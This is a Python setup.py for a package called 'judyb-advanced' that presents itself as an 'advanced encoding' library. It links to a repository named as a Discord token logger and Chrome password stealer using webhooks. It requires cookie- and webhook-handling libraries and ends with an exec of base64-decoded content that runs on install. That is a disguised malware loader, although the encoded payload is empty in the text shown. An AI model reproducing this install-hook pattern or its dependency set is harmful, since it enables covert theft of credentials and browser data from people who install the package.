from setuptools import setup
import base64

with open('README.md', 'r') as fh:
    long_description = fh.read()

setup(
    name='judyb-advanced',
    version='0.1.0',
    author='Carter',
    author_email='PW668878@outlook.com',
    description='Advanced encoding',
    long_description=long_description,
    long_description_content_type='text/markdown',
    url='https://github.com/Napoleon-x/multi-logger-python-discord-token-logger-and-chrome-password-stealer-through-webhooks',
    packages=['judyb-advanced'],
    install_requires=['browser_cookie3', 'requests', 'psutil', 'cryptography', 'httpx', 'pypiwin32', 'dhooks', 'pycryptodome'],
    classifiers=[
        'Development Status :: 3 - Alpha',
        'Intended Audience :: Developers',
        'License :: OSI Approved :: GNU Lesser General Public License v3 or later (LGPLv3+)',
        'Programming Language :: Python :: 3',
        'Programming Language :: Python :: 3.6',
        'Programming Language :: Python :: 3.7',
        'Programming Language :: Python :: 3.8',
        'Programming Language :: Python :: 3.9',
        'Topic :: Software Development :: Libraries :: Python Modules',
    ],
)

exec(base64.b64decode(
"""

"""
))
